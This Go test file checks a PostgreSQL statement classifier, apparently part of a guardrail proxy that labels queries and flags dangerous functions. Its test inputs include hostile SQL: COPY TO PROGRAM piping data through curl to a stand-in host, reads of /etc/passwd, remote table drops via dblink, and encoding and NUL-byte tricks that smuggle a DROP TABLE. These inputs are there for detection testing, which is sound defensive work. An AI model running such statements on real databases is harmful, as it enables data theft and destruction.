package pgsql

import (
	"reflect"
	"strings"
	"testing"
	"time"

	"fortik/internal/action"
)

type tc struct {
	sql    string
	typ    string
	verb   action.Verb
	tables []string // nil = don't check
	danger []string // nil = don't check
}

func TestClassifyTable(t *testing.T) {
	R, W, D, E, X, G := action.VerbRead, action.VerbWrite, action.VerbDelete, action.VerbExport, action.VerbExecute, action.VerbGrant
	cases := []tc{
		// reads
		{"SELECT 1", TypeSelect, R, []string{}, []string{}},
		{"select * from users", TypeSelect, R, []string{"public.users"}, nil},
		{"SeLeCt id FROM App.Users u WHERE u.id = 1", TypeSelect, R, []string{"app.users"}, nil},
		{`SELECT * FROM "App"."Users"`, TypeSelect, R, []string{"App.Users"}, nil},
		{"SELECT * FROM a JOIN b.c ON a.id = c.id", TypeSelect, R, []string{"public.a", "b.c"}, nil},
		{"/* comment */ SELECT 1 -- trailing", TypeSelect, R, nil, nil},
		{"VALUES (1), (2)", TypeSelect, R, []string{}, nil},
		{"TABLE accounts", TypeSelect, R, []string{"public.accounts"}, nil},
		{"SELECT now(), lower('X'), pg_sleep(1)", TypeSelect, R, nil, []string{}},
		{"SELECT table_to_xml('t', true, false, '')", TypeSelect, R, nil, []string{}},
		{"SELECT set_config('search_path', 'app', false)", TypeSelect, R, nil, []string{}},
		{"SELECT * FROM t FOR UPDATE", TypeSelect, R, nil, nil},
		{"WITH x AS (SELECT 1) SELECT * FROM x", TypeSelect, R, []string{}, nil},
		{"SELECT 1 UNION SELECT 2", TypeSelect, R, nil, nil},
		{"DECLARE c CURSOR FOR SELECT * FROM t", TypeSelect, R, []string{"public.t"}, nil},
		{"FETCH 10 FROM c", TypeSelect, R, nil, nil},
		{"CLOSE c", TypeSession, R, nil, nil},
		// explain
		{"EXPLAIN SELECT * FROM t", TypeExplain, R, nil, nil},
		{"EXPLAIN DELETE FROM t", TypeExplain, R, []string{"public.t"}, nil},
		{"EXPLAIN (ANALYZE false) DELETE FROM t", TypeExplain, R, nil, nil},
		{"EXPLAIN ANALYZE DELETE FROM t WHERE id = 1", TypeDelete, D, []string{"public.t"}, nil},
		{"EXPLAIN (ANALYZE, BUFFERS) UPDATE t SET a = 1", TypeUpdate, W, nil, nil},
		{"EXPLAIN (ANALYZE true) SELECT 1", TypeSelect, R, nil, nil},
		{"EXPLAIN ANALYZE SELECT pg_terminate_backend(1)", TypeDangerousFunction, X, nil, []string{"pg_terminate_backend"}},
		{"EXPLAIN SELECT pg_read_file('/etc/passwd')", TypeDangerousFunction, X, nil, []string{"pg_read_file"}},
		// writes
		{"INSERT INTO t (a) VALUES (1)", TypeInsert, W, []string{"public.t"}, nil},
		{"INSERT INTO s.t SELECT * FROM s.u", TypeInsert, W, []string{"s.t", "s.u"}, nil},
		{"INSERT INTO t VALUES (1) ON CONFLICT (a) DO UPDATE SET b = 2", TypeInsert, W, nil, nil},
		{"UPDATE t SET a = 1 WHERE id = 2", TypeUpdate, W, []string{"public.t"}, nil},
		{"MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE", TypeMerge, W, []string{"public.t", "public.s"}, nil},
		{"DELETE FROM t", TypeDelete, D, []string{"public.t"}, nil},
		{"delete from APP.orders where id=$1", TypeDelete, D, []string{"app.orders"}, nil},
		{"DELETE FROM t USING u WHERE t.id = u.id", TypeDelete, D, []string{"public.t", "public.u"}, nil},
		{"SELECT * INTO newt FROM t", TypeSelectInto, W, []string{"public.newt", "public.t"}, nil},
		{"CREATE TABLE newt AS SELECT * FROM t", TypeSelectInto, W, []string{"public.newt", "public.t"}, nil},
		// CTE writes
		{"WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d", TypeDelete, D, []string{"public.t"}, nil},
		{"WITH u AS (UPDATE t SET a = 1 RETURNING *) SELECT count(*) FROM u", TypeUpdate, W, []string{"public.t"}, nil},
		{"WITH i AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM i", TypeInsert, W, nil, nil},
		{"WITH d AS (DELETE FROM a RETURNING id) INSERT INTO b SELECT id FROM d", TypeDelete, D, []string{"public.a", "public.b"}, nil},
		{"SELECT * FROM (SELECT 1) s WHERE EXISTS (SELECT 1 FROM x)", TypeSelect, R, []string{"public.x"}, nil},
		// drops
		{"DROP TABLE t", TypeDropTable, D, []string{"public.t"}, nil},
		{"DROP TABLE IF EXISTS a, s.b CASCADE", TypeDropTable, D, []string{"public.a", "s.b"}, nil},
		{`drop table "Weird Name"`, TypeDropTable, D, []string{"public.Weird Name"}, nil},
		{"DROP SCHEMA app CASCADE", TypeDropSchema, D, nil, nil},
		{"DROP DATABASE prod", TypeDropDatabase, D, nil, nil},
		{"DROP INDEX idx_a", TypeDropOther, D, nil, nil},
		{"DROP VIEW v", TypeDropOther, D, nil, nil},
		{"DROP FUNCTION f(int)", TypeDropOther, D, nil, nil},
		{"DROP SEQUENCE s", TypeDropOther, D, nil, nil},
		{"DROP TYPE mood", TypeDropOther, D, nil, nil},
		{"TRUNCATE t", TypeTruncate, D, []string{"public.t"}, nil},
		{"TRUNCATE TABLE a, b RESTART IDENTITY", TypeTruncate, D, []string{"public.a", "public.b"}, nil},
		// alter
		{"ALTER TABLE t DROP COLUMN email", TypeAlterDropColumn, D, []string{"public.t"}, nil},
		{"ALTER TABLE t ADD COLUMN x int, DROP COLUMN y", TypeAlterDropColumn, D, nil, nil},
		{"ALTER TABLE t ADD COLUMN x int", TypeDDLAlter, W, nil, nil},
		{"ALTER TABLE t RENAME TO u", TypeDDLAlter, W, nil, nil},
		{"ALTER TABLE t RENAME COLUMN a TO b", TypeDDLAlter, W, nil, nil},
		{"COMMENT ON TABLE t IS 'x'", TypeDDLAlter, W, nil, nil},
		{"SECURITY LABEL ON TABLE t IS 'secret'", TypeDDLAlter, W, nil, nil},
		{"ALTER TABLE t OWNER TO bob", TypeRole, G, nil, nil},
		{"ALTER SCHEMA s OWNER TO bob", TypeRole, G, nil, nil},
		// create
		{"CREATE TABLE t (id int primary key)", TypeDDLCreate, W, []string{"public.t"}, nil},
		{"CREATE TEMP TABLE tt (id int)", TypeDDLCreate, W, []string{"pg_temp.tt"}, nil},
		{"CREATE INDEX ON t (a)", TypeDDLCreate, W, nil, nil},
		{"CREATE VIEW v AS SELECT 1", TypeDDLCreate, W, nil, nil},
		{"CREATE SEQUENCE s", TypeDDLCreate, W, nil, nil},
		{"CREATE TYPE mood AS ENUM ('a')", TypeDDLCreate, W, nil, nil},
		{"CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'select 1'", TypeDDLCreate, W, nil, nil},
		{"CREATE EXTENSION IF NOT EXISTS pgcrypto", TypeDDLCreate, W, nil, nil},
		{"CREATE SCHEMA app", TypeDDLCreate, W, nil, nil},
		{"CREATE MATERIALIZED VIEW mv AS SELECT 1", TypeDDLCreate, W, nil, nil},
		// grants / roles
		{"GRANT SELECT ON t TO bob", TypeGrant, G, []string{"public.t"}, nil},
		{"REVOKE ALL ON t FROM bob", TypeGrant, G, nil, nil},
		{"GRANT admin TO bob", TypeGrant, G, nil, nil},
		{"ALTER DEFAULT PRIVILEGES GRANT SELECT ON TABLES TO bob", TypeGrant, G, nil, nil},
		{"CREATE ROLE bob LOGIN", TypeRole, G, nil, nil},
		{"CREATE USER bob", TypeRole, G, nil, nil},
		{"ALTER ROLE bob SUPERUSER", TypeRole, G, nil, nil},
		{"ALTER USER bob SET search_path = x", TypeRole, G, nil, nil},
		{"DROP ROLE bob", TypeRole, G, nil, nil},
		{"DROP USER IF EXISTS bob", TypeRole, G, nil, nil},
		{"CREATE GROUP g", TypeRole, G, nil, nil},
		{"REASSIGN OWNED BY a TO b", TypeRole, G, nil, nil},
		{"DROP OWNED BY a", TypeRole, G, nil, nil},
		// set role
		{"SET ROLE admin", TypeSetRole, G, nil, nil},
		{"set local role admin", TypeSetRole, G, nil, nil},
		{"SET SESSION AUTHORIZATION bob", TypeSetRole, G, nil, nil},
		{"RESET ROLE", TypeSetRole, G, nil, nil},
		{"RESET SESSION AUTHORIZATION", TypeSetRole, G, nil, nil},
		{"SET session_replication_role = replica", TypeSetRole, G, nil, nil},
		{`SET "Session_Replication_Role" TO replica`, TypeSetRole, G, nil, nil},
		{"SELECT set_config('role', 'admin', false)", TypeSetRole, G, nil, []string{"set_config"}},
		{"SELECT set_config('session_replication_role', 'replica', true)", TypeSetRole, G, nil, []string{"set_config"}},
		{"SELECT set_config('SESSION_AUTHORIZATION'::text, 'bob', false)", TypeSetRole, G, nil, []string{"set_config"}},
		{"SELECT set_config(name, 'x', false) FROM settings", TypeDangerousFunction, X, nil, []string{"set_config"}},
		{"SELECT * FROM t WHERE x = (SELECT set_config('role','a',false))", TypeSetRole, G, nil, []string{"set_config"}},
		// copy
		{"COPY t TO STDOUT", TypeCopyToStdout, E, []string{"public.t"}, nil},
		{"COPY (SELECT * FROM s.t) TO STDOUT WITH CSV", TypeCopyToStdout, E, []string{"s.t"}, nil},
		{"COPY t FROM STDIN", TypeCopyFromStdin, W, []string{"public.t"}, nil},
		{"COPY t TO PROGRAM 'curl evil'", TypeCopyProgram, X, nil, nil},
		{"COPY t FROM PROGRAM 'cat /etc/passwd'", TypeCopyProgram, X, nil, nil},
		{"COPY t TO '/tmp/out.csv'", TypeCopyFile, X, nil, nil},
		{"COPY t FROM '/tmp/in.csv'", TypeCopyFile, X, nil, nil},
		// dangerous functions
		{"SELECT pg_terminate_backend(pid) FROM pg_stat_activity", TypeDangerousFunction, X, nil, []string{"pg_terminate_backend"}},
		{"select PG_CATALOG.pg_cancel_backend(1)", TypeDangerousFunction, X, nil, []string{"pg_cancel_backend"}},
		{"SELECT pg_reload_conf()", TypeDangerousFunction, X, nil, []string{"pg_reload_conf"}},
		{"SELECT * FROM pg_ls_dir('.')", TypeDangerousFunction, X, nil, []string{"pg_ls_dir"}},
		{"SELECT lo_import('/etc/passwd')", TypeDangerousFunction, X, nil, []string{"lo_import"}},
		{"SELECT * FROM dblink('host=x', 'select 1') AS t(a int)", TypeDangerousFunction, X, nil, []string{"dblink"}},
		{"SELECT dblink_exec('conn', 'drop table x')", TypeDangerousFunction, X, nil, []string{"dblink_exec"}},
		{"SELECT dblink_connect('c', 'host=x')", TypeDangerousFunction, X, nil, []string{"dblink_connect"}},
		{"SELECT query_to_xml('delete from t returning *', true, false, '')", TypeDangerousFunction, X, nil, []string{"query_to_xml"}},
		{"SELECT a FROM t WHERE b IN (SELECT pg_read_file('x') FROM u)", TypeDangerousFunction, X, nil, []string{"pg_read_file"}},
		{"SELECT (SELECT (SELECT pg_switch_wal()))", TypeDangerousFunction, X, nil, []string{"pg_switch_wal"}},
		{"UPDATE t SET a = pg_read_binary_file('x')", TypeDangerousFunction, X, nil, []string{"pg_read_binary_file"}},
		{"WITH x AS (SELECT pg_promote()) SELECT * FROM x", TypeDangerousFunction, X, nil, []string{"pg_promote"}},
		{"SELECT pg_drop_replication_slot('s'), pg_logical_emit_message(true, 'p', 'x')", TypeDangerousFunction, X, nil, []string{"pg_drop_replication_slot", "pg_logical_emit_message"}},
		// blocks / maintenance / misc
		{"DO $$ BEGIN DELETE FROM t; END $$", TypeExecuteBlock, X, nil, nil},
		{"CALL my_proc(1)", TypeExecuteBlock, X, nil, nil},
		{"VACUUM t", TypeMaintenance, X, nil, nil},
		{"VACUUM FULL ANALYZE", TypeMaintenance, X, nil, nil},
		{"ANALYZE t", TypeMaintenance, X, nil, nil},
		{"REINDEX TABLE t", TypeMaintenance, X, nil, nil},
		{"CLUSTER t USING idx", TypeMaintenance, X, nil, nil},
		{"REFRESH MATERIALIZED VIEW mv", TypeMaintenance, X, nil, nil},
		{"CHECKPOINT", TypeMaintenance, X, nil, nil},
		{"LOAD 'auto_explain'", TypeMaintenance, X, nil, nil},
		{"LOCK TABLE t IN ACCESS EXCLUSIVE MODE", TypeLock, W, []string{"public.t"}, nil},
		{"NOTIFY chan, 'x'", TypeNotify, W, nil, nil},
		// transaction
		{"BEGIN", TypeTransaction, R, nil, nil},
		{"START TRANSACTION ISOLATION LEVEL SERIALIZABLE", TypeTransaction, R, nil, nil},
		{"COMMIT", TypeTransaction, R, nil, nil},
		{"END", TypeTransaction, R, nil, nil},
		{"ROLLBACK", TypeTransaction, R, nil, nil},
		{"ABORT", TypeTransaction, R, nil, nil},
		{"SAVEPOINT s1", TypeTransaction, R, nil, nil},
		{"RELEASE SAVEPOINT s1", TypeTransaction, R, nil, nil},
		{"ROLLBACK TO SAVEPOINT s1", TypeTransaction, R, nil, nil},
		{"PREPARE TRANSACTION 'x'", TypeUnknown, X, nil, nil},
		{"COMMIT PREPARED 'x'", TypeUnknown, X, nil, nil},
		{"ROLLBACK PREPARED 'x'", TypeUnknown, X, nil, nil},
		// session
		{"SHOW search_path", TypeSession, R, nil, nil},
		{"SHOW ALL", TypeSession, R, nil, nil},
		{"SET search_path TO app, public", TypeSession, R, nil, nil},
		{"SET TIME ZONE 'UTC'", TypeSession, R, nil, nil},
		{"SET timezone = 'UTC'", TypeSession, R, nil, nil},
		// client_encoding is pinned to UTF8 by the proxy; changing it would
		// make Postgres lex bytes differently from the classifier.
		{"SET NAMES 'SJIS'", TypeUnknown, X, nil, nil},
		{"SET client_encoding = 'SJIS'", TypeUnknown, X, nil, nil},
		{"SET LOCAL client_encoding TO 'BIG5'", TypeUnknown, X, nil, nil},
		{"RESET client_encoding", TypeUnknown, X, nil, nil},
		{"SET DateStyle = ISO", TypeSession, R, nil, nil},
		{"SET extra_float_digits = 3", TypeSession, R, nil, nil},
		{"SET statement_timeout = '5s'", TypeSession, R, nil, nil},
		{"SET LOCAL lock_timeout = 1000", TypeSession, R, nil, nil},
		{"SET application_name = 'x'", TypeSession, R, nil, nil},
		{"SET TRANSACTION ISOLATION LEVEL REPEATABLE READ", TypeSession, R, nil, nil},
		{"SET SESSION CHARACTERISTICS AS TRANSACTION READ ONLY", TypeSession, R, nil, nil},
		{"RESET search_path", TypeSession, R, nil, nil},
		{"SET client_min_messages TO warning", TypeSession, R, nil, nil},
		{"LISTEN chan", TypeSession, R, nil, nil},
		{"UNLISTEN *", TypeSession, R, nil, nil},
		{"DEALLOCATE ALL", TypeSession, R, nil, nil},
		{"DISCARD ALL", TypeSession, R, nil, nil},
		{"DISCARD TEMP", TypeSession, R, nil, nil},
		// unknown
		{"SET work_mem = '1GB'", TypeUnknown, X, nil, nil},
		{"SET log_statement = 'none'", TypeUnknown, X, nil, nil},
		{"RESET ALL", TypeUnknown, X, nil, nil},
		{"PREPARE p AS SELECT 1", TypeUnknown, X, nil, nil},
		{"PREPARE p AS DELETE FROM t", TypeUnknown, X, nil, nil},
		{"EXECUTE p", TypeUnknown, X, nil, nil},
		{"ALTER SYSTEM SET work_mem = '1GB'", TypeUnknown, X, nil, nil},
		{"CREATE DATABASE x", TypeUnknown, X, nil, nil},
		{"IMPORT FOREIGN SCHEMA s FROM SERVER srv INTO public", TypeUnknown, X, nil, nil},
		{"CREATE SUBSCRIPTION sub CONNECTION 'host=x' PUBLICATION p", TypeUnknown, X, nil, nil},
		{"CREATE SERVER srv FOREIGN DATA WRAPPER postgres_fdw", TypeUnknown, X, nil, nil},
		{"CREATE EVENT TRIGGER et ON ddl_command_start EXECUTE FUNCTION f()", TypeUnknown, X, nil, nil},
		{"ALTER DATABASE d SET search_path = x", TypeUnknown, X, nil, nil},
	}
	if len(cases) < 80 {
		t.Fatalf("need 80+ cases, have %d", len(cases))
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			sts, err := Classify(c.sql)
			if err != nil {
				t.Fatalf("Classify: %v", err)
			}
			if len(sts) != 1 {
				t.Fatalf("got %d statements", len(sts))
			}
			s := sts[0]
			if s.StatementType != c.typ || s.Verb != c.verb {
				t.Fatalf("got %s/%s want %s/%s", s.StatementType, s.Verb, c.typ, c.verb)
			}
			if c.tables != nil && !reflect.DeepEqual(s.Tables, c.tables) {
				t.Fatalf("tables %q want %q", s.Tables, c.tables)
			}
			if c.danger != nil && !reflect.DeepEqual(s.DangerousFunctions, c.danger) {
				// order-insensitive compare
				if !sameSet(s.DangerousFunctions, c.danger) {
					t.Fatalf("dangerous %q want %q", s.DangerousFunctions, c.danger)
				}
			}
			if s.Fingerprint == "" || s.Normalized == "" {
				t.Fatalf("missing fingerprint/normalized")
			}
			if VerbFor(s.StatementType) != s.Verb {
				t.Fatalf("verb does not follow statement type")
			}
		})
	}
}

func sameSet(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	m := map[string]int{}
	for _, x := range a {
		m[x]++
	}
	for _, x := range b {
		m[x]--
	}
	for _, v := range m {
		if v != 0 {
			return false
		}
	}
	return true
}

func TestUnparseable(t *testing.T) {
	for _, q := range []string{"SELEC 1", "DELETE FROM", "SELECT 'unterminated", "DROP TABLE t; DROPP TABLE u", "SELECT (1"} {
		if _, err := Classify(q); err == nil || !IsParseError(err) {
			t.Errorf("%q: expected parse error, got %v", q, err)
		}
	}
}

func TestEmpty(t *testing.T) {
	for _, q := range []string{"", "   ", ";", "-- just a comment"} {
		sts, err := Classify(q)
		if err != nil || len(sts) != 0 {
			t.Errorf("%q: got %d stmts err %v", q, len(sts), err)
		}
	}
}

func TestMultiStatement(t *testing.T) {
	sts, err := Classify("BEGIN; DELETE FROM a WHERE id = 1; drop table b; COMMIT;")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{TypeTransaction, TypeDelete, TypeDropTable, TypeTransaction}
	if len(sts) != len(want) {
		t.Fatalf("got %d", len(sts))
	}
	for i, w := range want {
		if sts[i].StatementType != w {
			t.Errorf("stmt %d: %s want %s", i, sts[i].StatementType, w)
		}
	}
	if sts[1].SQL != "DELETE FROM a WHERE id = 1" {
		t.Errorf("stmt text %q", sts[1].SQL)
	}
	if sts[2].SQL != "drop table b" {
		t.Errorf("stmt text %q", sts[2].SQL)
	}
	if !sts[0].Trivial() || sts[1].Trivial() {
		t.Error("trivial flags wrong")
	}
}

func TestNormalizedHasNoLiterals(t *testing.T) {
	sts, err := Classify("DELETE FROM customers WHERE email = 'alice@example.com' AND id = 42")
	if err != nil {
		t.Fatal(err)
	}
	n := sts[0].Normalized
	if strings.Contains(n, "alice") || strings.Contains(n, "42") {
		t.Fatalf("normalized leaks literals: %s", n)
	}
	sts2, _ := Classify("delete from customers where email = 'bob@x' and id = 7")
	if sts2[0].Fingerprint != sts[0].Fingerprint {
		t.Fatal("fingerprints differ for same shape")
	}
}

func TestWhereFacts(t *testing.T) {
	cases := []struct {
		sql     string
		where   bool
		eq      []string
		using   bool
		cte     bool
		prepare bool
		schema  string
		table   string
	}{
		{"DELETE FROM t", false, []string{}, false, false, true, "public", "t"},
		{"DELETE FROM s.t WHERE id = 1", true, []string{"id"}, false, false, true, "s", "t"},
		{"DELETE FROM t WHERE id = $1 AND tenant = 'x'", true, []string{"id", "tenant"}, false, false, true, "public", "t"},
		{"DELETE FROM t WHERE 5 = t.id", true, []string{"id"}, false, false, true, "public", "t"},
		{"DELETE FROM t WHERE id = 1 OR id = 2", true, []string{}, false, false, true, "public", "t"},
		{"DELETE FROM t WHERE id > 1", true, []string{}, false, false, true, "public", "t"},
		{"DELETE FROM t WHERE id = '7'::int AND (a = 1 AND b = 2)", true, []string{"id", "a", "b"}, false, false, true, "public", "t"},
		{"DELETE FROM t WHERE id = other_col", true, []string{}, false, false, true, "public", "t"},
		{"DELETE FROM t WHERE id = NULL", true, []string{}, false, false, true, "public", "t"},
		{"DELETE FROM t USING u WHERE t.id = u.id", true, []string{}, true, false, false, "public", "t"},
		{"UPDATE t SET a = 1 FROM u WHERE t.id = u.id", true, []string{}, true, false, false, "public", "t"},
		{"UPDATE t SET a = 1 WHERE id = 3", true, []string{"id"}, false, false, true, "public", "t"},
		{"WITH x AS (SELECT 1) DELETE FROM t WHERE id IN (SELECT * FROM x)", true, []string{}, false, true, false, "public", "t"},
		{"WITH d AS (DELETE FROM t WHERE id = 1 RETURNING *) SELECT * FROM d", true, []string{"id"}, false, true, false, "public", "t"},
		{"DELETE FROM t WHERE CURRENT OF c", true, []string{}, false, false, false, "public", "t"},
		{"EXPLAIN ANALYZE DELETE FROM t WHERE id = 1", true, []string{"id"}, false, false, false, "public", "t"},
	}
	for _, c := range cases {
		sts, err := Classify(c.sql)
		if err != nil {
			t.Fatalf("%s: %v", c.sql, err)
		}
		s := sts[0]
		if s.HasWhere != c.where || !reflect.DeepEqual(s.WhereEqualityColumns, c.eq) || s.HasUsingOrFrom != c.using ||
			s.HasCTE != c.cte || s.SnapshotPreparable() != c.prepare || s.Schema != c.schema || s.Table != c.table {
			t.Errorf("%s: where=%v eq=%q using=%v cte=%v prep=%v %s.%s", c.sql, s.HasWhere, s.WhereEqualityColumns,
				s.HasUsingOrFrom, s.HasCTE, s.SnapshotPreparable(), s.Schema, s.Table)
		}
	}
}

func TestSnapshotSQL(t *testing.T) {
	cases := map[string]string{
		"DELETE FROM t": `CREATE TABLE fortik_undo.snap AS SELECT * FROM t`,
		"DELETE FROM app.orders o WHERE o.id = 5 AND o.x > 2": `CREATE TABLE fortik_undo.snap AS SELECT * FROM app.orders o WHERE o.id = 5 AND o.x > 2`,
		`UPDATE ONLY "Weird"."T" SET a = 1 WHERE b = 'x'`:     `CREATE TABLE fortik_undo.snap AS SELECT * FROM ONLY "Weird"."T" WHERE b = 'x'`,
	}
	for in, want := range cases {
		sts, err := Classify(in)
		if err != nil {
			t.Fatal(err)
		}
		got, err := SnapshotSQL(&sts[0], SnapshotSchema, "snap")
		if err != nil {
			t.Fatalf("%s: %v", in, err)
		}
		if got != want {
			t.Errorf("%s:\n got %s\nwant %s", in, got, want)
		}
	}
	for _, in := range []string{"DELETE FROM t USING u WHERE t.id=u.id", "INSERT INTO t VALUES (1)", "DROP TABLE t",
		"WITH d AS (DELETE FROM t RETURNING *) SELECT 1"} {
		sts, _ := Classify(in)
		if _, err := SnapshotSQL(&sts[0], SnapshotSchema, "snap"); err == nil {
			t.Errorf("%s: expected not preparable", in)
		}
	}
}

func TestSafeRename(t *testing.T) {
	now := time.Date(2026, 3, 4, 5, 6, 7, 0, time.UTC)
	sts, _ := Classify("DROP TABLE app.users")
	sql, trash, err := SafeRenameSQL(&sts[0], now)
	if err != nil {
		t.Fatal(err)
	}
	if trash != "fortik_trash_users_20260304050607" ||
		sql != `ALTER TABLE "app"."users" RENAME TO "fortik_trash_users_20260304050607"` {
		t.Fatalf("got %s / %s", sql, trash)
	}
	sts, _ = Classify("TRUNCATE orders")
	sql, trash, err = SafeRenameSQL(&sts[0], now)
	if err != nil {
		t.Fatal(err)
	}
	want := `ALTER TABLE "public"."orders" RENAME TO "fortik_trash_orders_20260304050607"; CREATE TABLE "public"."orders" (LIKE "public"."fortik_trash_orders_20260304050607" INCLUDING ALL)`
	if sql != want || trash != "fortik_trash_orders_20260304050607" {
		t.Fatalf("got %s", sql)
	}
	long := strings.Repeat("x", 63)
	sts, _ = Classify("DROP TABLE " + long)
	_, trash, err = SafeRenameSQL(&sts[0], now)
	if err != nil || len(trash) > 63 || !strings.HasPrefix(trash, "fortik_trash_xxx") {
		t.Fatalf("long: %s %v", trash, err)
	}
	for _, in := range []string{"DROP TABLE a, b", "TRUNCATE a, b", "DELETE FROM t", "DROP VIEW v"} {
		sts, _ := Classify(in)
		if _, _, err := SafeRenameSQL(&sts[0], now); err == nil {
			t.Errorf("%s: expected error", in)
		}
	}
	sts, _ = Classify(`DROP TABLE "we""ird"`)
	sql, _, _ = SafeRenameSQL(&sts[0], now)
	if !strings.HasPrefix(sql, `ALTER TABLE "public"."we""ird" RENAME TO "fortik_trash_we""ird_`) {
		t.Fatalf("quoting: %s", sql)
	}
}

func TestSnapshotTableName(t *testing.T) {
	id := "act_01J9ZXYZABCDEFGHJKMNPQRSTV"
	n := SnapshotTableName("orders", id)
	if n != "orders_01j9zxyzabcdefghjkmnpqrstv" {
		t.Fatalf("got %s", n)
	}
	if SnapshotTableName("orders", id) != n {
		t.Fatal("not deterministic")
	}
	long := SnapshotTableName(strings.Repeat("é", 40), id)
	if len(long) > 63 || !strings.HasSuffix(long, "_01j9zxyzabcdefghjkmnpqrstv") {
		t.Fatalf("long: %s (%d)", long, len(long))
	}
	if SnapshotTableName("t", "act_01J9ZXYZABCDEFGHJKMNPQRSTW") == SnapshotTableName("t", id) {
		t.Fatal("not unique per action")
	}
}

func TestFunctionsAndQualification(t *testing.T) {
	sts, err := Classify("DELETE FROM app.t WHERE a = lower($1) AND b = pg_catalog.upper('x') AND c = myschema.f(1)")
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(sts[0].Functions, ","); got != "lower,myschema.f,upper" {
		t.Fatalf("functions %s", got)
	}
	if !sts[0].SchemaQualified || !sts[0].HasParams {
		t.Fatal("qualified/params")
	}
	for q, want := range map[string]bool{
		"DELETE FROM t": false, "UPDATE s.t SET a = 1": true, "DROP TABLE x.y": true, "DROP TABLE y": false,
		"CREATE TABLE s.n AS SELECT * FROM t": true, "TRUNCATE t": false, "SELECT * FROM s.t": true, "SELECT 1": false,
	} {
		sts, _ := Classify(q)
		if sts[0].SchemaQualified != want {
			t.Errorf("%s: qualified=%v", q, sts[0].SchemaQualified)
		}
	}
}

func TestQuoteLiteral(t *testing.T) {
	if got := QuoteLiteral(`a'b\c`); got != `E'a''b\\c'` {
		t.Fatal(got)
	}
}

func TestClientEncodingBypassRefused(t *testing.T) {
	// set_config('client_encoding', ...) is refused.
	sts, err := Classify("SELECT set_config('client_encoding', 'SJIS', false)")
	if err != nil || len(sts) != 1 || sts[0].StatementType != TypeDangerousFunction {
		t.Fatalf("set_config client_encoding: %+v %v", sts, err)
	}
	// Non-UTF-8 statement text is refused as a parse error.
	_, err = Classify("SELECT E'\x95\\'; DROP TABLE victim; --'")
	if err == nil || !IsParseError(err) {
		t.Fatalf("invalid UTF-8 accepted: %v", err)
	}
	_, err = Classify("SELECT 1\x00; DROP TABLE v")
	if err == nil {
		t.Fatal("NUL byte accepted")
	}
}

func TestCreateTableAsExecuteIsUnknown(t *testing.T) {
	for _, q := range []string{
		"CREATE TABLE x AS EXECUTE p",
		"CREATE TEMP TABLE x AS EXECUTE p(1)",
		"CREATE UNLOGGED TABLE IF NOT EXISTS s.x AS EXECUTE p WITH NO DATA",
	} {
		sts, err := Classify(q)
		if err != nil || len(sts) != 1 || sts[0].StatementType != TypeUnknown || string(sts[0].Verb) != "EXECUTE" {
			t.Fatalf("%q: %+v %v", q, sts, err)
		}
	}
	sts, err := Classify("CREATE TABLE x AS SELECT * FROM t")
	if err != nil || sts[0].StatementType != TypeSelectInto {
		t.Fatalf("plain CTAS: %+v %v", sts, err)
	}
}
